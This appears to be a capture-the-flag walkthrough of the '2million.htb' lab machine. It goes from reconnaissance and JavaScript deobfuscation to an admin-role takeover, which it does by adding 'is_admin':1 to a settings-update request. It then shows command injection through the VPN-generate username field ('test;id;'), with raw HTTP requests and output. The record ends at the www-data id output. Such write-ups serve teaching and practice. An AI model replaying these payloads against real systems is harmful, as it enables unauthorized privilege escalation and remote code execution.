
Step 1: Nmap

```
Command: nmap -A --top-port 10000 10.129.229.66 --min-rate 1000
```

```
Output:

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 13:48 -0400
Nmap scan report for 10.129.229.66
Host is up (0.12s latency).
Not shown: 8378 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   120.99 ms 10.10.14.1
2   121.59 ms 10.129.229.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds


```


Step 2: View Page Source

```
And found:

/invite

and

<script defer src="[/js/inviteapi.min.js](view-source:http://2million.htb/js/inviteapi.min.js)"></script> <script defer> $(document).ready(function() { $('#verifyForm').submit(function(e) { e.preventDefault(); var code = $('#code').val(); var formData = { "code": code }; $.ajax({ type: "POST", dataType: "json", data: formData, url: '/api/v1/invite/verify', success: function(response) { if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") { // Store the invite code in localStorage localStorage.setItem('inviteCode', code); window.location.href = '/register'; } else { alert("Invalid invite code. Please try again."); } }, error: function(response) { alert("An error occurred. Please try again."); } }); }); }); </script>
```

Step 3: Browse to path [/js/inviteapi.min.js](view-source:http://2million.htb/js/inviteapi.min.js)

```
eval(function (p, a, c, k, e, d) {
  e = function (c) {
    return c.toString(36);
  };
  if (!"".replace(/^/, String)) {
    while (c--) {
      d[c.toString(a)] = k[c] || c.toString(a);
    }
    k = [function (e) {
      return d[e];
    }];
    e = function () {
      return "\\w+";
    };
    c = 1;
  }
  ;
  while (c--) {
    if (k[c]) {
      p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
    }
  }
  return p;
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, "response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify".split("|"), 0, {}));

```

Step 4: Deobfuscated JavaScript

```
Found this github repo: lelinhtinh.github.io/de4js](https://lelinhtinh.github.io/de4js/
```

And here is the output:

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```


Step 5: After read the code, I see an interesting in url: /api/v1/invite/how/to/generate

I need to send POST request to that

```
Command: curl http://2million.htb/api/v1/invite/how/to/generate -X POST | jq
```

```
Output:

{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```


Step 6: Using CyberChef to decode ROT13

```
ROT13: Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr

OUTPUT: In order to generate the invite code, make a POST request to /api/v1/invite/generate
```


Step 7: Get the invite code

```
Command: curl http://2million.htb/api/v1/invite/generate -X POST | jq
```

```
Output:

{
  "0": 200,
  "success": 1,
  "data": {
    "code": "QTBGSEMtOUo4WEwtU1g3TUstVVhVS0s=",
    "format": "encoded"
  }
}

```

Decode base64:

```
Command: echo "QTBGSEMtOUo4WEwtU1g3TUstVVhVS0s=" | base64 -d
```

```
Output: A0FHC-9J8XL-SX7MK-UXUKK
```


Step 8: After login get stuck and Try to fuzz

```
Command:  ffuf -u http://2million.htb/api/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -fs 162
```

```
Output: v1
```

```
Command: ffuf -u http://2million.htb/api/v1/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -fs 162
```

```
Output: None
```

Use Burpsuite to intercept a POST request of login

```
POST /api/v1/user/login HTTP/1.1
Host: 2million.htb
Content-Length: 36
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://2million.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=lh9gdikug9gn6fdhokmhcrai8d
Connection: keep-alive

email=test%40gmail.com&password=test 
```

And try to find more endpoint using with the cookie

```
Command: curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=lh9gdikug9gn6fdhokmhcrai8d" | jq
```

```
Output:

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

```


Step 9: Exploit

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Length: 59
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://2million.htb
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/login
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=lh9gdikug9gn6fdhokmhcrai8d
Connection: keep-alive

{"email":"test@gmail.com", "password":"test", "is_admin":1}

```

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Mar 2026 18:48:32 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 40

{"id":13,"username":"test","is_admin":1}
```


```
GET /api/v1/admin/auth HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=lh9gdikug9gn6fdhokmhcrai8d
Connection: keep-alive


```

```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Mar 2026 18:48:58 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 16

{"message":true}
```


Step 10: Get User Shell

```
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=lh9gdikug9gn6fdhokmhcrai8d
Connection: keep-alive
Content-Length: 27

{"username":"test;id;"
  }
```


```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 22 Mar 2026 19:02:20 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 54

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


